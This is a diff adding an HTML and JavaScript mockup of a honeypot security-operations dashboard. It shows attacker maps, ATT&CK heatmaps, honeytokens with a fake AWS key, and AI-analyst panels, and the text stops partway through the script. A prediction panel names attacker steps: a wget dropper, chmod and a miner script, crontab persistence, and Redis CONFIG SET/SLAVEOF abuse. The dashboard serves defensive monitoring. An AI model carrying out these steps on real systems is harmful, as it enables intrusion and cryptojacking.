@@ -1,0 +1,806 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+--bg:#060d1a;--bg2:#0b1221;--bg3:#101828;--bg4:#162030;--bg5:#1c2a3e;
+--c1:#00e5ff;--c2:#00ff9d;--c3:#ff2d55;--c4:#ff8c00;--c5:#a855f7;--c6:#ffd60a;
+--t:#c8d8f0;--tm:#6b8ab0;--tb:#253552;--brd:#1a2d4a;
+}
+#wrap{background:var(--bg);color:var(--t);font-family:'Courier New',monospace;font-size:11px;border-radius:12px;overflow:hidden;display:flex;flex-direction:column;height:640px}
+
+/* TOP NAV */
+#topnav{height:42px;background:var(--bg2);border-bottom:1px solid var(--brd);display:flex;align-items:center;padding:0 14px;gap:10px;flex-shrink:0}
+.logo-box{display:flex;align-items:center;gap:8px;margin-right:10px}
+.logo-hex{width:26px;height:26px;background:linear-gradient(135deg,#00e5ff22,#a855f722);border:1px solid var(--c1);border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:11px;color:var(--c1)}
+.logo-text{font-size:11px;font-weight:700;color:var(--c1);letter-spacing:.06em}
+.logo-sub{font-size:8px;color:var(--tm);letter-spacing:.04em}
+.search-box{flex:1;max-width:260px;background:var(--bg3);border:1px solid var(--brd);border-radius:6px;padding:4px 10px;font-size:10px;color:var(--t);outline:none}
+.search-box::placeholder{color:var(--tm)}
+.top-right{margin-left:auto;display:flex;align-items:center;gap:10px}
+.user-chip{display:flex;align-items:center;gap:6px;background:var(--bg3);border:1px solid var(--brd);border-radius:20px;padding:3px 10px 3px 4px}
+.avatar{width:20px;height:20px;border-radius:50%;background:var(--c1);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;color:#000}
+.live-dot{width:6px;height:6px;border-radius:50%;background:var(--c2);animation:pulse 1.8s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+#clock{font-size:9px;color:var(--tm)}
+
+/* BODY SPLIT */
+#body{flex:1;display:flex;overflow:hidden}
+
+/* SIDEBAR */
+#sidebar{width:54px;background:var(--bg2);border-right:1px solid var(--brd);display:flex;flex-direction:column;align-items:center;padding:10px 0;gap:4px;flex-shrink:0}
+.nb{width:38px;height:38px;border-radius:8px;border:none;background:transparent;color:var(--tm);cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;font-size:15px;position:relative;transition:.15s}
+.nb:hover,.nb.on{background:rgba(0,229,255,.08);color:var(--c1)}
+.nb.on::before{content:'';position:absolute;left:0;top:6px;bottom:6px;width:2px;background:var(--c1);border-radius:0 2px 2px 0}
+.nb .nlabel{font-size:6px;letter-spacing:.03em;text-transform:uppercase;color:inherit}
+.nb .badge{position:absolute;top:4px;right:4px;width:8px;height:8px;border-radius:50%;background:var(--c3);font-size:6px;display:flex;align-items:center;justify-content:center;color:#fff}
+.divider{width:28px;height:1px;background:var(--brd);margin:4px 0}
+
+/* MAIN CONTENT */
+#main{flex:1;overflow:hidden;display:flex;flex-direction:column}
+#pages{flex:1;overflow:hidden}
+.pg{display:none;height:100%;overflow-y:auto;padding:12px}
+.pg.on{display:block}
+
+/* SECTION HEADER */
+.sec-hdr{display:flex;align-items:center;gap:8px;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid var(--brd)}
+.sec-title{font-size:13px;font-weight:700;color:var(--c1);letter-spacing:.05em;text-transform:uppercase}
+.sec-sub{font-size:9px;color:var(--tm);margin-left:auto}
+
+/* KPI STRIP */
+.kpis{display:grid;grid-template-columns:repeat(6,1fr);gap:6px;margin-bottom:10px}
+.kpi{background:var(--bg3);border:1px solid var(--brd);border-radius:8px;padding:8px 10px;cursor:pointer;transition:.15s;position:relative;overflow:hidden}
+.kpi:hover{border-color:var(--c1);background:var(--bg4)}
+.kpi::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px}
+.kpi.c1::after{background:var(--c1)}.kpi.c2::after{background:var(--c2)}.kpi.c3::after{background:var(--c3)}.kpi.c4::after{background:var(--c4)}.kpi.c5::after{background:var(--c5)}.kpi.c6::after{background:var(--c6)}
+.kpi-l{font-size:8px;color:var(--tm);text-transform:uppercase;letter-spacing:.06em}
+.kpi-v{font-size:18px;font-weight:700;margin:2px 0;line-height:1}
+.kpi-s{font-size:8px;color:var(--tm)}
+
+/* GRID LAYOUTS */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px}
+.g3{display:grid;grid-template-columns:2fr 1fr;gap:8px;margin-bottom:8px}
+.g3r{display:grid;grid-template-columns:1fr 2fr;gap:8px;margin-bottom:8px}
+.g4{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:8px}
+
+/* PANELS */
+.pnl{background:var(--bg3);border:1px solid var(--brd);border-radius:8px;padding:10px}
+.pnl-t{font-size:8px;color:var(--tm);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.pnl-t i{color:var(--c1)}
+
+/* BAR ROWS */
+.br{display:flex;align-items:center;gap:6px;margin-bottom:4px}
+.bl{width:68px;font-size:8px;color:var(--tm);text-align:right;flex-shrink:0}
+.bt{flex:1;height:4px;background:rgba(255,255,255,.04);border-radius:2px;overflow:hidden}
+.bf{height:100%;border-radius:2px;transition:width .6s}
+.bv{font-size:8px;color:var(--t);width:28px;text-align:right}
+
+/* FEED */
+.fi{display:flex;align-items:center;gap:5px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:9px}
+.fi:last-child{border:none}
+.sb{padding:1px 4px;border-radius:3px;font-size:7px;font-weight:700;flex-shrink:0}
+.ss{background:rgba(0,229,255,.12);color:var(--c1)}
+.sh{background:rgba(0,255,157,.1);color:var(--c2)}
+.sm{background:rgba(168,85,247,.12);color:var(--c5)}
+.so{background:rgba(255,140,0,.1);color:var(--c4)}
+.sy{background:rgba(255,214,10,.1);color:var(--c6)}
+.sr{background:rgba(255,45,85,.12);color:var(--c3)}
+.fip{color:var(--c1);flex-shrink:0;width:92px;overflow:hidden;text-overflow:ellipsis}
+.fe{color:var(--tm);flex:1;overflow:hidden;white-space:nowrap;text-overflow:ellipsis}
+.rp{padding:1px 5px;border-radius:8px;font-size:7px;font-weight:700;flex-shrink:0}
+.rc{background:rgba(255,45,85,.2);color:var(--c3)}
+.rh{background:rgba(255,140,0,.2);color:var(--c4)}
+.rm{background:rgba(255,214,10,.15);color:var(--c6)}
+.rl{background:rgba(100,130,180,.15);color:var(--tm)}
+
+/* ATTACK MAP */
+#mapC{width:100%;height:120px;display:block;border-radius:6px;background:var(--bg2)}
+
+/* ATT&CK MATRIX */
+.mx{display:grid;grid-template-columns:repeat(7,1fr);gap:3px}
+.mcol{display:flex;flex-direction:column;gap:2px}
+.mh{font-size:6px;text-transform:uppercase;color:var(--tm);text-align:center;padding:3px 2px;border-bottom:1px solid var(--brd);margin-bottom:2px;letter-spacing:.04em}
+.mc{border-radius:3px;padding:3px 2px;font-size:6px;text-align:center;cursor:pointer;min-height:20px;display:flex;align-items:center;justify-content:center;transition:.15s}
+.mc:hover{filter:brightness(1.4)}
+.m0{background:rgba(255,255,255,.03);color:rgba(255,255,255,.2)}
+.m1{background:rgba(255,214,10,.18);color:var(--c6)}
+.m2{background:rgba(255,140,0,.28);color:var(--c4)}
+.m3{background:rgba(255,45,85,.32);color:var(--c3);animation:cellpulse 2s ease-in-out infinite}
+@keyframes cellpulse{0%,100%{opacity:1}50%{opacity:.7}}
+
+/* ATTACKER CARDS */
+.ac-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.ac{background:var(--bg3);border-radius:8px;padding:10px;border-left:3px solid var(--c3);cursor:pointer;transition:.15s}
+.ac.h{border-left-color:var(--c4)}.ac.m{border-left-color:var(--c6)}.ac:hover{background:var(--bg4)}
+.ac-ip{font-size:12px;color:var(--c1);font-weight:700;margin-bottom:1px}
+.ac-meta{font-size:8px;color:var(--tm);margin-bottom:6px}
+.tags{display:flex;gap:3px;flex-wrap:wrap;margin-bottom:5px}
+.tag{padding:1px 5px;border-radius:3px;font-size:7px}
+.tag-t{background:rgba(255,140,0,.15);color:var(--c4)}
+.tag-c{background:rgba(0,229,255,.08);color:var(--c1)}
+.ac-stats{display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;margin-top:6px}
+.ac-stat{text-align:center;background:var(--bg2);border-radius:4px;padding:3px}
+.ac-sv{font-size:11px;font-weight:700;color:var(--t)}
+.ac-sl{font-size:7px;color:var(--tm)}
+
+/* ALERT LIST */
+.al{display:flex;gap:8px;padding:8px;background:var(--bg4);border-radius:6px;margin-bottom:6px;border-left:3px solid var(--brd)}
+.al.c{border-left-color:var(--c3)}.al.h{border-left-color:var(--c4)}.al.m{border-left-color:var(--c6)}
+.al-icon{font-size:16px;flex-shrink:0}
+.al-body{flex:1}
+.al-title{font-size:10px;font-weight:700;color:var(--t);margin-bottom:2px}
+.al-det{font-size:8px;color:var(--tm)}
+.al-meta{display:flex;gap:6px;margin-top:4px}
+.al-tag{padding:1px 5px;border-radius:3px;font-size:7px;background:var(--bg2);color:var(--tm)}
+.al-time{font-size:8px;color:var(--tm);white-space:nowrap}
+
+/* TOKEN LIST */
+.tk{display:flex;align-items:center;gap:8px;padding:7px 10px;background:var(--bg4);border-radius:6px;margin-bottom:5px;cursor:pointer;transition:.15s}
+.tk:hover{background:var(--bg5)}
+.tkdot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.tkdot.ok{background:var(--c2)}.tkdot.ng{background:var(--c3);animation:pulse 1s infinite}
+.tkname{font-size:9px;color:var(--t);flex:1;font-family:'Courier New',monospace}
+.tktype{font-size:8px;color:var(--tm);width:80px}
+.tklast{font-size:8px;width:90px;text-align:right}
+.tklast.ng{color:var(--c3)}.tklast.ok{color:var(--tm)}
+
+/* PCAP SECTION */
+.pcap-row{display:flex;align-items:center;gap:6px;padding:5px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:8px}
+.pcap-row:last-child{border:none}
+.pcap-num{color:var(--tm);width:30px}
+.pcap-proto{padding:1px 4px;border-radius:3px;font-size:7px;font-weight:700;width:40px;text-align:center}
+.pp-tcp{background:rgba(0,229,255,.12);color:var(--c1)}
+.pp-udp{background:rgba(168,85,247,.12);color:var(--c5)}
+.pp-http{background:rgba(0,255,157,.1);color:var(--c2)}
+.pcap-src{color:var(--c1);width:110px}
+.pcap-dst{color:var(--c4);width:110px}
+.pcap-info{color:var(--tm);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.pcap-len{color:var(--tm);width:40px;text-align:right}
+
+/* AI ANALYST */
+.ai-msg{margin-bottom:10px;padding:10px;background:var(--bg4);border-radius:8px;border-left:2px solid var(--c5)}
+.ai-hdr{font-size:9px;color:var(--c5);margin-bottom:4px;display:flex;align-items:center;gap:6px}
+.ai-body{font-size:9px;color:var(--t);line-height:1.6}
+.ai-tags{display:flex;gap:4px;margin-top:6px;flex-wrap:wrap}
+.ai-tag{padding:2px 6px;border-radius:3px;font-size:7px;background:rgba(168,85,247,.15);color:var(--c5)}
+.threat-score{display:flex;align-items:center;gap:10px;padding:8px;background:var(--bg2);border-radius:6px;margin-bottom:8px}
+.score-ring{width:48px;height:48px;border-radius:50%;border:3px solid var(--c3);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;color:var(--c3);flex-shrink:0}
+.score-info{flex:1}
+.score-label{font-size:8px;color:var(--tm);text-transform:uppercase;letter-spacing:.06em}
+.score-val{font-size:11px;color:var(--t);margin-top:2px}
+
+/* SANDBOX */
+.sb-result{padding:8px;background:var(--bg4);border-radius:6px;margin-bottom:6px;border:1px solid var(--brd)}
+.sb-hash{font-size:8px;color:var(--tm);font-family:'Courier New',monospace;margin-bottom:4px}
+.sb-name{font-size:10px;font-weight:700;color:var(--t);margin-bottom:4px}
+.sb-verdict{display:inline-block;padding:2px 8px;border-radius:4px;font-size:8px;font-weight:700;margin-bottom:4px}
+.sbv-mal{background:rgba(255,45,85,.2);color:var(--c3)}
+.sbv-sus{background:rgba(255,140,0,.2);color:var(--c4)}
+.sbv-clean{background:rgba(0,255,157,.15);color:var(--c2)}
+.sb-tags{display:flex;gap:4px;flex-wrap:wrap}
+.sb-tag{padding:1px 5px;border-radius:3px;font-size:7px;background:rgba(255,255,255,.05);color:var(--tm)}
+
+/* SIGMA / IOC */
+.sigma-rule{background:var(--bg2);border-radius:6px;padding:8px;margin-bottom:6px;border-left:2px solid var(--c4)}
+.sigma-hdr{font-size:9px;color:var(--c4);margin-bottom:4px;font-weight:700}
+.sigma-body{font-size:8px;color:var(--tm);font-family:'Courier New',monospace;line-height:1.5}
+
+/* MINI CHART */
+.sparkline{display:flex;align-items:flex-end;gap:2px;height:40px;margin:4px 0}
+.spk-bar{flex:1;border-radius:2px 2px 0 0;min-height:3px;transition:.3s}
+
+/* TIMELINE */
+.tl-item{display:flex;gap:8px;margin-bottom:8px;position:relative}
+.tl-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;margin-top:2px}
+.tl-line{position:absolute;left:4px;top:12px;bottom:-8px;width:1px;background:var(--brd)}
+.tl-item:last-child .tl-line{display:none}
+.tl-body{flex:1}
+.tl-time{font-size:7px;color:var(--tm)}
+.tl-title{font-size:9px;color:var(--t);margin:1px 0}
+.tl-detail{font-size:8px;color:var(--tm)}
+
+/* DETECTION CARDS */
+.det-card{background:var(--bg4);border-radius:6px;padding:8px;margin-bottom:6px;display:flex;align-items:flex-start;gap:8px}
+.det-sev{width:6px;border-radius:3px;align-self:stretch;flex-shrink:0}
+.det-body{flex:1}
+.det-name{font-size:9px;font-weight:700;color:var(--t);margin-bottom:2px}
+.det-detail{font-size:8px;color:var(--tm);margin-bottom:4px}
+.det-count{font-size:11px;font-weight:700;color:var(--c1)}
+.det-label{font-size:7px;color:var(--tm)}
+
+/* NETWORK GRAPH CANVAS */
+#netC{width:100%;height:180px;background:var(--bg2);border-radius:6px;display:block}
+</style>
+
+<div id="wrap">
+<!-- TOP NAV -->
+<div id="topnav">
+  <div class="logo-box">
+    <div class="logo-hex">⬡</div>
+    <div><div class="logo-text">RIO6IX SOC</div><div class="logo-sub">Honeypot Command Center</div></div>
+  </div>
+  <input class="search-box" placeholder="Search IP, service, tactic, event...">
+  <div class="live-dot"></div>
+  <span style="font-size:9px;color:var(--c2)">LIVE</span>
+  <div class="top-right">
+    <div class="user-chip"><div class="avatar">CI</div><span style="font-size:9px">Chanuka · Operator</span></div>
+    <div id="clock" style="font-size:9px;color:var(--tm)"></div>
+  </div>
+</div>
+
+<!-- BODY -->
+<div id="body">
+<!-- SIDEBAR -->
+<div id="sidebar">
+  <button class="nb on" onclick="show('overview')" title="Dashboard"><i class="ti ti-layout-dashboard"></i><span class="nlabel">Home</span></button>
+  <button class="nb" onclick="show('map')" title="Attack Map"><i class="ti ti-map-2"></i><span class="nlabel">Map</span></button>
+  <button class="nb" onclick="show('logs')" title="Live Logs"><i class="ti ti-terminal-2"></i><span class="nlabel">Logs</span><span class="badge"></span></button>
+  <button class="nb" onclick="show('attackers')" title="Attackers"><i class="ti ti-users"></i><span class="nlabel">IPs</span></button>
+  <button class="nb" onclick="show('matrix')" title="ATT&CK"><i class="ti ti-grid-dots"></i><span class="nlabel">ATT&CK</span></button>
+  <button class="nb" onclick="show('detections')" title="Detections"><i class="ti ti-shield-check"></i><span class="nlabel">Detect</span></button>
+  <div class="divider"></div>
+  <button class="nb" onclick="show('honeytokens')" title="Honeytokens"><i class="ti ti-key"></i><span class="nlabel">Tokens</span></button>
+  <button class="nb" onclick="show('pcap')" title="PCAP Forensics"><i class="ti ti-network"></i><span class="nlabel">PCAP</span></button>
+  <button class="nb" onclick="show('sandbox')" title="Sandbox"><i class="ti ti-bug"></i><span class="nlabel">Box</span></button>
+  <button class="nb" onclick="show('ai')" title="AI Analyst"><i class="ti ti-brain"></i><span class="nlabel">AI</span></button>
+  <div class="divider"></div>
+  <button class="nb" onclick="show('alerts')" title="Alerts"><i class="ti ti-bell"></i><span class="nlabel">Alerts</span><span class="badge">6</span></button>
+  <button class="nb" onclick="show('intel')" title="Threat Intel"><i class="ti ti-radar"></i><span class="nlabel">Intel</span></button>
+  <button class="nb" onclick="show('timeline')" title="Kill Chain"><i class="ti ti-timeline"></i><span class="nlabel">Chain</span></button>
+  <button class="nb" style="margin-top:auto" onclick="sendPrompt('Show me the RIO6IX honeypot configuration and deployment guide')" title="Settings"><i class="ti ti-settings"></i><span class="nlabel">Setup</span></button>
+</div>
+
+<!-- MAIN -->
+<div id="main">
+<div id="pages">
+
+<!-- ══ OVERVIEW ══ -->
+<div class="pg on" id="pg-overview">
+  <div class="sec-hdr"><span class="sec-title">Dashboard — Live Defensive Telemetry</span><span class="sec-sub" id="kdate"></span></div>
+  <div class="kpis">
+    <div class="kpi c3" onclick="sendPrompt('Show total attack breakdown by service for my honeypot')"><div class="kpi-l">Total events</div><div class="kpi-v" style="color:var(--c3)" id="kv0">0</div><div class="kpi-s">↑ 18% vs yesterday</div></div>
+    <div class="kpi c1" onclick="sendPrompt('Show all unique attacker IPs today')"><div class="kpi-l">Unique IPs</div><div class="kpi-v" style="color:var(--c1)" id="kv1">0</div><div class="kpi-s">14 high-risk flagged</div></div>
+    <div class="kpi c4" onclick="sendPrompt('What ATT&CK tactics have been detected today?')"><div class="kpi-l">ATT&CK tactics</div><div class="kpi-v" style="color:var(--c4)" id="kv2">0</div><div class="kpi-s">34 techniques hit</div></div>
+    <div class="kpi c5" onclick="sendPrompt('Which honeytokens have been triggered?')"><div class="kpi-l">Token triggers</div><div class="kpi-v" style="color:var(--c5)" id="kv3">0</div><div class="kpi-s">3 confirmed exfil</div></div>
+    <div class="kpi c2" onclick="sendPrompt('Show malware samples captured today')"><div class="kpi-l">Malware captured</div><div class="kpi-v" style="color:var(--c2)" id="kv4">0</div><div class="kpi-s">VirusTotal verified</div></div>
+    <div class="kpi c6" onclick="sendPrompt('What is the current threat risk score?')"><div class="kpi-l">Risk score</div><div class="kpi-v" style="color:var(--c6)" id="kv5">0</div><div class="kpi-s">out of 100 · CRITICAL</div></div>
+  </div>
+  <div class="g3">
+    <div class="pnl">
+      <div class="pnl-t"><i class="ti ti-map-2"></i>Live attack map — real-time arc projection</div>
+      <canvas id="mapC"></canvas>
+    </div>
+    <div class="pnl">
+      <div class="pnl-t"><i class="ti ti-activity"></i>Live event feed</div>
+      <div id="feed0"></div>
+    </div>
+  </div>
+  <div class="g2">
+    <div class="pnl">
+      <div class="pnl-t"><i class="ti ti-server"></i>Service breakdown</div>
+      <div id="svcbars"></div>
+    </div>
+    <div class="pnl">
+      <div class="pnl-t"><i class="ti ti-terminal"></i>Top commands</div>
+      <div id="cmdbars"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ ATTACK MAP ══ -->
+<div class="pg" id="pg-map">
+  <div class="sec-hdr"><span class="sec-title">Live Attack Map</span><span class="sec-sub">Real-time geolocation arc projection</span></div>
+  <div class="pnl" style="margin-bottom:8px">
+    <div class="pnl-t"><i class="ti ti-map-2"></i>Global attacker origin map — click country for details</div>
+    <canvas id="bigMapC" style="width:100%;height:220px;display:block;background:var(--bg2);border-radius:6px"></canvas>
+  </div>
+  <div class="g4">
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-flag"></i>Top source countries</div><div id="ctry"></div></div>
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-building-bank"></i>Top ASNs</div><div id="asns"></div></div>
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-timeline"></i>Attacks / 10 min</div>
+      <div class="sparkline" id="spark"></div>
+      <div style="font-size:7px;color:var(--tm);margin-top:2px">Last 2 hours — 12 buckets of 10 min</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ LIVE LOGS ══ -->
+<div class="pg" id="pg-logs">
+  <div class="sec-hdr"><span class="sec-title">Live Log Terminal</span><span class="sec-sub">Auto-scroll · right-click to copy · ATT&CK tagged</span></div>
+  <div class="pnl">
+    <div class="pnl-t"><i class="ti ti-terminal-2"></i>Structured event stream — last 15 events
+      <span style="margin-left:auto;cursor:pointer;color:var(--c1)" onclick="sendPrompt('Export the latest honeypot log events as JSON')">⬇ Export</span>
+    </div>
+    <div id="logfeed" style="font-size:8px;line-height:1.8"></div>
+  </div>
+  <div class="g2" style="margin-top:8px">
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-chart-bar"></i>Events last 60 min</div><div class="sparkline" id="spark2"></div></div>
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-filter"></i>Quick filters</div>
+      <div style="display:flex;flex-wrap:wrap;gap:4px;margin-top:4px">
+        <span style="padding:2px 8px;border-radius:4px;background:rgba(0,229,255,.12);color:var(--c1);font-size:8px;cursor:pointer">SSH</span>
+        <span style="padding:2px 8px;border-radius:4px;background:rgba(0,255,157,.1);color:var(--c2);font-size:8px;cursor:pointer">HTTP</span>
+        <span style="padding:2px 8px;border-radius:4px;background:rgba(168,85,247,.12);color:var(--c5);font-size:8px;cursor:pointer">MySQL</span>
+        <span style="padding:2px 8px;border-radius:4px;background:rgba(255,140,0,.1);color:var(--c4);font-size:8px;cursor:pointer">Redis</span>
+        <span style="padding:2px 8px;border-radius:4px;background:rgba(255,45,85,.12);color:var(--c3);font-size:8px;cursor:pointer">CRITICAL</span>
+        <span style="padding:2px 8px;border-radius:4px;background:rgba(255,255,255,.05);color:var(--tm);font-size:8px;cursor:pointer">All</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ ATTACKERS ══ -->
+<div class="pg" id="pg-attackers">
+  <div class="sec-hdr"><span class="sec-title">Attacker Profiles</span><span class="sec-sub">ML-clustered · geoenriched · TTP fingerprinted</span></div>
+  <div class="ac-grid" id="acGrid"></div>
+</div>
+
+<!-- ══ ATT&CK MATRIX ══ -->
+<div class="pg" id="pg-matrix">
+  <div class="sec-hdr"><span class="sec-title">MITRE ATT&CK Matrix</span><span class="sec-sub">Click technique to view matching events</span></div>
+  <div class="pnl" style="margin-bottom:8px">
+    <div class="pnl-t"><i class="ti ti-grid-dots"></i>Enterprise matrix heatmap — 7 tactic columns · live hit counts
+      <span style="margin-left:auto;cursor:pointer;color:var(--c1)" onclick="sendPrompt('Export ATT&CK Navigator layer JSON from my honeypot data')">⬇ Navigator export</span>
+    </div>
+    <div class="mx" id="mxGrid"></div>
+    <div style="display:flex;gap:10px;margin-top:8px;align-items:center">
+      <span style="font-size:8px;color:var(--tm)">Heat:</span>
+      <span class="mc m0" style="width:36px;padding:3px">0 hits</span>
+      <span class="mc m1" style="width:36px;padding:3px">1–5</span>
+      <span class="mc m2" style="width:36px;padding:3px">6–20</span>
+      <span class="mc m3" style="width:36px;padding:3px">21+</span>
+    </div>
+  </div>
+  <div class="g2">
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-chart-bar"></i>Top 5 techniques hit</div><div id="toptech"></div></div>
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-target"></i>Tactic distribution</div><div id="tactdist"></div></div>
+  </div>
+</div>
+
+<!-- ══ DETECTIONS ══ -->
+<div class="pg" id="pg-detections">
+  <div class="sec-hdr"><span class="sec-title">Detection Engineering</span><span class="sec-sub">Sigma rules · playbooks · response actions</span></div>
+  <div id="detList"></div>
+</div>
+
+<!-- ══ HONEYTOKENS ══ -->
+<div class="pg" id="pg-honeytokens">
+  <div class="sec-hdr"><span class="sec-title">Honeytoken Board</span><span class="sec-sub">Canary callbacks · fake credentials · AWS keys · SSH keys</span></div>
+  <div class="pnl" style="margin-bottom:8px">
+    <div class="pnl-t"><i class="ti ti-key"></i>Active tokens — 2 triggered · 6 armed
+      <span style="margin-left:auto;cursor:pointer;color:var(--c1)" onclick="sendPrompt('Generate a new honeytoken AWS credential for my honeypot')">+ New token</span>
+    </div>
+    <div id="tokenList"></div>
+  </div>
+  <div class="g2">
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-alert-triangle"></i>Triggered token detail</div>
+      <div style="padding:8px;background:rgba(255,45,85,.08);border-radius:6px;border:1px solid rgba(255,45,85,.2)">
+        <div style="font-size:9px;color:var(--c3);font-weight:700;margin-bottom:4px">⚡ AKIAIOSFODNN7FAKE — used externally</div>
+        <div style="font-size:8px;color:var(--tm)">Source IP: 5.188.206.14 · Russia · AS 206728<br>Time: 2026-06-03 12:31:44 UTC<br>Action: AWS API call GetCallerIdentity<br>Region: us-east-1 · likely automated tool</div>
+      </div>
+    </div>
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-chart-pie"></i>Token type breakdown</div>
+      <div id="tokbars"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ PCAP FORENSICS ══ -->
+<div class="pg" id="pg-pcap">
+  <div class="sec-hdr"><span class="sec-title">PCAP Forensics</span><span class="sec-sub">Per-session packet capture · DPI · JA3/HASSH fingerprinting</span></div>
+  <div class="g2" style="margin-bottom:8px">
+    <div class="pnl">
+      <div class="pnl-t"><i class="ti ti-files"></i>Captured sessions</div>
+      <div id="pcapSessions"></div>
+    </div>
+    <div class="pnl">
+      <div class="pnl-t"><i class="ti ti-network"></i>Packet view — session SSH_5188_20240603_1431</div>
+      <div id="pcapRows"></div>
+    </div>
+  </div>
+  <div class="pnl">
+    <div class="pnl-t"><i class="ti ti-fingerprint"></i>TLS / SSH fingerprints</div>
+    <div id="fpRows"></div>
+  </div>
+</div>
+
+<!-- ══ SANDBOX ══ -->
+<div class="pg" id="pg-sandbox">
+  <div class="sec-hdr"><span class="sec-title">Malware Sandbox Results</span><span class="sec-sub">Cuckoo · VirusTotal · Any.run · SHA256 IOC</span></div>
+  <div id="sbList"></div>
+</div>
+
+<!-- ══ AI ANALYST ══ -->
+<div class="pg" id="pg-ai">
+  <div class="sec-hdr"><span class="sec-title">AI Analyst Engine</span><span class="sec-sub">Claude-powered behavioral analysis · LSTM kill chain prediction</span></div>
+  <div class="g3r">
+    <div class="pnl">
+      <div class="pnl-t"><i class="ti ti-brain"></i>Session behavioral reports</div>
+      <div id="aiMsgs"></div>
+    </div>
+    <div>
+      <div class="pnl" style="margin-bottom:8px">
+        <div class="pnl-t"><i class="ti ti-chart-radar"></i>Threat actor risk matrix</div>
+        <div id="threatScores"></div>
+      </div>
+      <div class="pnl">
+        <div class="pnl-t"><i class="ti ti-arrows-shuffle"></i>Predicted next action</div>
+        <div style="font-size:8px;color:var(--tm);line-height:1.6">
+          Based on LSTM sequence model:<br>
+          <span style="color:var(--c3)">5.188.206.14</span> — after wget dropper, likely next: <span style="color:var(--c4)">chmod +x</span> → <span style="color:var(--c4)">./miner.sh</span> → <span style="color:var(--c3)">crontab persistence</span><br><br>
+          <span style="color:var(--c3)">91.240.118.3</span> — after Redis CONFIG SET, likely: <span style="color:var(--c4)">SLAVEOF</span> → data exfil → <span style="color:var(--c3)">worm spread</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ ALERTS ══ -->
+<div class="pg" id="pg-alerts">
+  <div class="sec-hdr"><span class="sec-title">Alert Center</span><span class="sec-sub">Severity routing · SOAR playbooks · Slack · email</span></div>
+  <div id="alertList"></div>
+</div>
+
+<!-- ══ THREAT INTEL ══ -->
+<div class="pg" id="pg-intel">
+  <div class="sec-hdr"><span class="sec-title">Threat Intelligence</span><span class="sec-sub">IOC export · STIX/TAXII · Sigma rules · GreyNoise · OTX</span></div>
+  <div class="g2">
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-code"></i>Generated Sigma rules</div><div id="sigmaList"></div></div>
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-database-export"></i>IOC export — last 24h</div><div id="iocList"></div></div>
+  </div>
+</div>
+
+<!-- ══ KILL CHAIN TIMELINE ══ -->
+<div class="pg" id="pg-timeline">
+  <div class="sec-hdr"><span class="sec-title">Kill Chain Timeline</span><span class="sec-sub">ATT&CK stage sequencing · session replay · actor dwell time</span></div>
+  <div class="g2">
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-timeline"></i>Session 5.188.206.14 — kill chain replay</div><div id="tlItems"></div></div>
+    <div class="pnl"><div class="pnl-t"><i class="ti ti-network"></i>Attacker relationship graph</div>
+      <canvas id="netC"></canvas>
+      <div style="font-size:7px;color:var(--tm);margin-top:4px">Nodes = IPs · Edges = shared credential or command pattern</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /pages -->
+</div><!-- /main -->
+</div><!-- /body -->
+</div><!-- /wrap -->
+
+<script>
+// ── NAV ──
+const pgs=['overview','map','logs','attackers','matrix','detections','honeytokens','pcap','sandbox','ai','alerts','intel','timeline'];
+function show(name){
+  document.querySelectorAll('.pg').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.nb').forEach(b=>b.classList.remove('on'));
+  document.getElementById('pg-'+name).classList.add('on');
+  const idx=pgs.indexOf(name);
+  if(idx>=0) document.querySelectorAll('.nb')[idx].classList.add('on');
+  if(name==='map') drawBigMap();
+  if(name==='timeline') drawNet();
+}
+
+// ── CLOCK ──
+function tick(){
+  const d=new Date();
+  document.getElementById('clock').textContent=d.toLocaleString('en-GB',{hour12:false});
+  document.getElementById('kdate').textContent='UTC '+d.toUTCString().slice(5,25);
+}
+tick();setInterval(tick,1000);
+
+// ── KPI COUNTUP ──
+const kvT=[4218,312,8,7,23,87];
+['kv0','kv1','kv2','kv3','kv4','kv5'].forEach((id,i)=>{
+  let v=0;const t=kvT[i];const step=Math.max(1,Math.ceil(t/40));
+  const iv=setInterval(()=>{v=Math.min(v+step,t);document.getElementById(id).textContent=v.toLocaleString();if(v>=t)clearInterval(iv);},28);
+});
+
+// ── SERVICE BARS ──
